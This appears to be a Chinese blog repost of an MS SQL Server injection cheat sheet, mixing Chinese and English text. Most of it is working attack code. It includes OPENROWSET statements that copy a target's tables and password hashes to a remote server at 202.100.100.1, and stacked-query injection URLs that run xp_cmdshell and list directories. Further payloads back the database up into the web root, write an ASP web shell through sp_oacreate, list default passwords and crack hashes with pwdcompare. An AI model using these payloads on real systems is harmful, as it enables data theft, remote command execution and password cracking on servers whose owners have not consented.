<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from OPENROWSET('SQLOLEDB', 'server=servername;uid=sa;pwd=apachy_123', 'select * from table1' ) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>参数: (1) OLEDB Provider name</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>2、 其中连接字符串参数可以是任何和端口用来连接,比如</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>要复制目标主机的整个数据库，首先要在目标主机上和自己机器上的数据库建立连接(如何在目标主机上建立远程连接，刚才已经讲了),之后insert所有远程表到本地表。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>基本语法：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'server=servername;uid=sa;pwd=apachy_123', 'select * from table1') select * from table2 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table1') select * from table2</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=hack3r;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from _sysdatabases') </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from master.dbo.sysdatabases </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=hack3r;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from _sysobjects') </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from user_database.dbo.sysobjects </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from _syscolumns') </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from user_database.dbo.syscolumns</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>之后，便可以从本地数据库中看到目标主机的库结构，这已经易如反掌，不多讲，复制数据库：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table1') select * from database..table1 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table2') select * from database..table2</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>...... </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>3、 复4、 制哈西表（HASH）</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>这实际上是上述复5、 制数据库的一个扩展应用。登录密码的hash存储于sysxlogins中。方法如下：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from _sysxlogins') select * from database.dbo.sysxlogins</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>得到hash之后，6、 就可以进行暴力破解。这需要一点运气和大量时间。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>遍历目录的方法：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>先创建一个临时表：temp</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'5;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id) exec master.dbo.xp_subdirs 'c:\';-- 获得子目录列表</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- 获得所有子目录的目录树结构,并寸入temp表中</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';-- 查看某个文件的内容</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id) exec master.dbo.xp_cmdshell 'dir c:\';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id) exec master.dbo.xp_cmdshell 'dir c:\ *.asp /s/a';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id) exec master.dbo.xp_cmdshell 'cscript C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5';insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- （xp_dirtree适用权限PUBLIC）</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>写入表：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句1：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('sysadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句2：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('serveradmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句3：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('setupadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句4：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('securityadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句5：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('securityadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句6：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('diskadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句7：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('bulkadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句8：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_SRVROLEMEMBER('bulkadmin'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句9：http://www.xxxxx.com/down/list.asp?id=1　and　1=(select IS_MEMBER('db_owner'));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>把路径写到表中去：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://www.xxxxx.com/down/list.asp?id=1;create　table　dirs(paths varchar(100), id int)- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://http://www.xxxxx.com/down/list.asp?id=1;insert 　dirs　exec　master.dbo.xp_dirtree 'c:\'- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://http://www.xxxxx.com/down/list.asp?id=1　and　0&lt;&gt;(select　top　1　paths　from　dirs)- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://http://www.xxxxx.com/down/list.asp?id=1　and　0&lt;&gt;(select　top　1　paths　from　dirs　where　paths　not　in('@Inetpub'))- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句：http://http://www.xxxxx.com/down/list.asp?id=1;create　table　dirs1(paths　varchar(100),　id　int)-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句：http://http://www.xxxxx.com/down/list.asp?id=1;insert　dirs　exec　master.dbo.xp_dirtree 'e:\web'-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>语句：http://http://www.xxxxx.com/down/list.asp?id=1　and　0&lt;&gt;(select　top　1　paths　from　dirs1)- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>把数据库备份到网页目录：下载</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://http://www.xxxxx.com/down/list.asp?id=1;declare　@a　sysname;　set　@a=db_name();backup　database　@a　to　disk='e:\web\down.bak';-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and%201=(select%20top%201%20name%20from(select%20top%2012%20id,name%20from%20sysobjects%20where%20xtype=char(85))%20T%20order%20by%20id%20desc)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and%201=(select%20Top%201%20col_name(object_id('USER_LOGIN'),1)%20from%20sysobjects) 参看相关表。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 1=(select%20user_id%20from%20USER_LOGIN)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and%200=(select%20user%20from%20USER_LOGIN%20where%20user&gt;1)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> ……………………………………………………</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>-- wscript.shell example </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @o int </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oacreate 'wscript.shell', @o out </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oamethod @o, 'run', NULL, 'notepad.exe' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>It could be run in our sample scenario by specifying the following username (all on one line): </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>2) This example uses the 'scripting.filesystemobject' object to read a known text file: </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>-- scripting.filesystemobject example - read a known file </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @o int, @f int, @t int, @ret int </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @line varchar(8000) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oacreate 'scripting.filesystemobject', @o out </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oamethod @o, 'opentextfile', @f out, 'c:\boot.ini', 1 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec @ret = sp_oamethod @f, 'readline', @line out </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>while( @ret = 0 ) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>begin </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>print @line </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec @ret = sp_oamethod @f, 'readline', @line out </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>end </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>3) This example creates an ASP script that will run any command passed to it in the querystring: </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>-- scripting.filesystemobject example - create a 'run this' .asp file </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @o int, @f int, @t int, @ret int </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oacreate 'scripting.filesystemobject', @o out </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oamethod @o, 'createtextfile', @f out, 'c:\inetpub\wwwroot\foo.asp', 1 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec @ret = sp_oamethod @f, 'writeline', NULL, </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'&lt;% set o = server.createobject("wscript.shell"): o.run( request.querystring("cmd") ) %&gt;' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>It is important to note that when running on a Windows NT4, IIS4 platform, commands issued by this ASP script will run as the 'system' account. In IIS5, however, they will run as the low-privileged IWAM_xxx account. </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>4) This (somewhat spurious) example illustrates the flexibility of the technique; it uses the 'speech.voicetext' object, causing the SQL Server to speak: Page 16</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @o int, @ret int </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oacreate 'speech.voicetext', @o out </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oamethod @o, 'register', NULL, 'foo', 'bar' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oasetproperty @o, 'speed', 150 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec sp_oamethod @o, 'speak', NULL, 'all your sequel servers are belong to,us', 528 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>waitfor delay '00:00:05' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>This could of course be run in our example scenario, by specifying the following 'username' (note that the example is not only injecting a script, but simultaneously logging in to the application as 'admin'): </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Username: admin'; declare @o int, @ret int exec sp_oacreate 'speech.voicetext', @o out exec sp_oamethod @o, 'register', NULL, 'foo', 'bar' exec sp_oasetproperty @o, 'speed', 150 exec sp_oamethod @o, 'speak', NULL, 'all your sequel servers are belong to us', 528 waitfor delay '00:00:05'-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>常用密码和相关语句：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>password </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sqlserver </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sql </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>admin </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sesame </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sa </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>guest </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Here is the script: </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(sqlcrack.sql) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>create table tempdb..passwords( pwd varchar(255) ) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>bulk insert tempdb..passwords from 'c:\temp\passwords.txt' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select name, pwd from tempdb..passwords inner join sysxlogins </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>on (pwdcompare( pwd, sysxlogins.password, 0 ) = 1) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select name, name from sysxlogins where </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(pwdcompare( name, sysxlogins.password, 0 ) = 1) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select sysxlogins.name, null from sysxlogins join syslogins on sysxlogins.sid=syslogins.sid </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>where sysxlogins.password is null and </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>syslogins.isntgroup=0 and </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>syslogins.isntuser=0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>drop table tempdb..passwords </span>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ecb9acf6cafe051bd4188b835e0caf2f/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">java  File,FileReader,BufferedReader,BufferedWriter,FileWriter</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/efee9082ab4e6ee876e2eafcecee0efa/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Failed to resolve: com.github</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function 